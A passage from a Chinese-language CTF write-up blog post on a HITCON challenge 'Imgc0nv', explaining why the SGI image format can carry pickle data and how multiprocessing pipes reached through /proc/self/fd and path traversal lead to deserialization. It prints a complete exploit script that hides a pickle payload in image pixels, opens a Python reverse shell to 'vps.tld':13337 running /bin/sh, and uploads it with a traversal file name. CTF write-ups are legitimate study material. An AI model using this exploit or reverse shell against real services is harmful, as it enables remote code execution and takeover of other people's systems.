&quot;/sys/bus/nd/drivers/nvdimm&quot;,</span><br><span class="line">        &quot;/usr/local/lib/python3.13/site-packages/pip/_internal/metadata/importlib&quot;,</span><br><span class="line">        &quot;/usr/lib/mime&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;ico&quot;: [</span><br><span class="line">        &quot;/usr/lib/x86_64-linux-gnu/perl-base/unicore/lib/BidiM&quot;,</span><br><span class="line">        &quot;/usr/local/lib/python3.13/site-packages/gunicorn&quot;,</span><br><span class="line">        &quot;/usr/local/lib/python3.13/site-packages/gunicorn-23.0.0.dist-info&quot;,</span><br><span class="line">        &quot;/usr/lib/x86_64-linux-gnu/perl-base/unicore&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;mpo&quot;: [</span><br><span class="line">        &quot;/usr/local/lib/python3.13/importlib&quot;,</span><br><span class="line">        &quot;/usr/local/lib/python3.13/site-packages/pip/_internal/metadata/importlib&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;sgi&quot;: [</span><br><span class="line">        &quot;/usr/local/lib/python3.13/wsgiref&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;bmp&quot;: [</span><br><span class="line">        &quot;/usr/share/doc/libmpfr6&quot;,</span><br><span class="line">        &quot;/usr/share/doc/libmpc3&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>选择转化为sgi是因为基于后续的内容存储<br>当然这只是第一步<br>如何选择文件格式，基于它的文件内容存储，实现比较好的pickle数据传输进行反序列化呢?</p>
+<h3 id="文件选择"><a href="#文件选择" class="headerlink" title="文件选择"></a>文件选择</h3><p>这一步其实是一个描述我初做时的问题<br>所以都是二进制数据，可以传入python代码被理解吗?后面也许会看看<br>首先pass掉大部分文件比如PNG,JPEG,GIF等等，他们会进行压缩编码等等，影响我们传入的pickle数据，一些过于复杂的格式也pass掉<br>目光看到未压缩或简单结构的格式<br>比如BMP 和 SGI</p>
+<h4 id="BMP"><a href="#BMP" class="headerlink" title="BMP"></a>BMP</h4><p>是一种简单的未压缩位图格式。它包含一个文件头（BITMAPFILEHEADER）和一个信息头（BITMAPINFOHEADER），之后就是原始的BGR像素数据。<br>缺点：文件头是固定的结构，其内容（如图像大小）会影响数据解析。<br>更重要的是，BMP格式默认会进行4字节对齐（Padding）。这意味着图像每行的字节数如果不是4的倍数，它会自动补零。<br>这会破坏我们精心计算的Payload偏移，让利用变得非常复杂和不可靠。虽然有人用超大BMP文件成功利用（用海量数据淹没管道，赌Payload能对齐），但这种方式效率低下且不稳定。</p>
+<h4 id="SIG"><a href="#SIG" class="headerlink" title="SIG"></a>SIG</h4><p>SGI格式有一个固定且较短的文件头。作者指出其文件头签名是 0x01da0001。这个头是固定的，我们可以提前知道它的内容<br>原始（Raw）的像素数据：在文件头之后，SGI格式通常会直接存储连续的、未压缩的RGB像素数据<br>选择它可以很好的存入pickle数据不被各种情况影响  </p>
+<p>当Python的 multiprocessing.Pool() 被创建时，它会在后台创建新的子进程，并且为了和这些子进程通信，它会建立管道（Pipe）。<br>这个管道在操作系统内部本质上就是一个先进先出（FIFO）的数据队列。一个进程往里面写，另一个进程可以从里面读。<br>我们把数据传入这个地方，可以让它对恶意内容进行pickle反序列化处理  </p>
+<h3 id="multiprocessing-的进程间通信（IPC）是通过-pickle-实现-CVE"><a href="#multiprocessing-的进程间通信（IPC）是通过-pickle-实现-CVE" class="headerlink" title="multiprocessing 的进程间通信（IPC）是通过 pickle 实现-CVE"></a>multiprocessing 的进程间通信（IPC）是通过 pickle 实现-CVE</h3><p><a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2020-10796&timestamp__1384=eq0x0DRDnD9jqAKDsKgDCql/iK+32bD">CVE-2020-10796</a><br>阿里云上找CVE复现倒还是很方便的()<br>至于对该CVE的复现，就放到其他地方吧，最后附一篇exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line">CONV_URL = <span class="string">&#x27;http://chall.tld/convert&#x27;</span></span><br><span class="line">width, height = <span class="number">65535</span>, <span class="number">159</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), <span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">draw = ImageDraw.Draw(img)</span><br><span class="line">draw.rectangle([(<span class="number">65504</span>, <span class="number">3</span>), (<span class="number">65505</span>, <span class="number">3</span>)], fill=<span class="string">&#x27;#0000FF&#x27;</span>) <span class="comment"># size=0xFFFF (0xFF x 2px)</span></span><br><span class="line"><span class="comment"># reverse shell</span></span><br><span class="line">payload = <span class="string">b&#x27;cbuiltins\nexec\n(Vimport socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;vps.tld&quot;,13337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\ntR....&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(payload):</span><br><span class="line">    draw.rectangle([</span><br><span class="line">        ((<span class="number">65506</span> + i) % width, <span class="number">3</span> - (<span class="number">65506</span> + i) // width),</span><br><span class="line">        ((<span class="number">65506</span> + i) % width, <span class="number">3</span> - (<span class="number">65506</span> + i) // width)</span><br><span class="line">    ], fill=<span class="string">&#x27;#FFFF%02X&#x27;</span> % (c))</span><br><span class="line">img.save(<span class="string">&#x27;pixel.png&#x27;</span>, <span class="string">&#x27;PNG&#x27;</span>)</span><br><span class="line"><span class="comment">##### request #####</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pixel.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    fd = <span class="number">10</span></span><br><span class="line">    path = <span class="string">f&#x27;/proc/self/fd/<span class="subst">&#123;fd&#125;</span>&#x27;</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;files&#x27;</span>: (<span class="string">f&#x27;/usr/local/lib/python3.13/w<span class="subst">&#123;path&#125;</span>ref/../../../../../../../../../../.<span class="subst">&#123;path&#125;</span>&#x27;</span>, f)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(CONV_URL, files=files, data=&#123;<span class="string">&#x27;format&#x27;</span>: <span class="string">&#x27;SGI&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以前做php文件上传的题目习惯不好，对于各个文件格式没有清晰认识，这里面使用了<code>img.save(f, format=output_format)</code>进行转换，注定了要找到一个可以控制数据的文件类型，这里选择了SGI，感觉可以作为一个出题点()</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E8%B6%8A%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text">跨越目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%80%89%E6%8B%A9"><span class="toc-number">2.2.</span> <span class="toc-text">文件选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BMP"><span class="toc-number">2.2.1.</span> <span class="toc-text">BMP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SIG"><span class="toc-number">2.2.2.</span> <span class="toc-text">SIG</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multiprocessing-%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%EF%BC%88IPC%EF%BC%89%E6%98%AF%E9%80%9A%E8%BF%87-pickle-%E5%AE%9E%E7%8E%B0-CVE"><span class="toc-number">2.3.</span> <span class="toc-text">multiprocessing 的进程间通信（IPC）是通过 pickle 实现-CVE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&text=HitconCTF-Imgc0nv"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&is_video=false&description=HitconCTF-Imgc0nv"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HitconCTF-Imgc0nv&body=Check out this article: https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&name=HitconCTF-Imgc0nv&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&t=HitconCTF-Imgc0nv"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
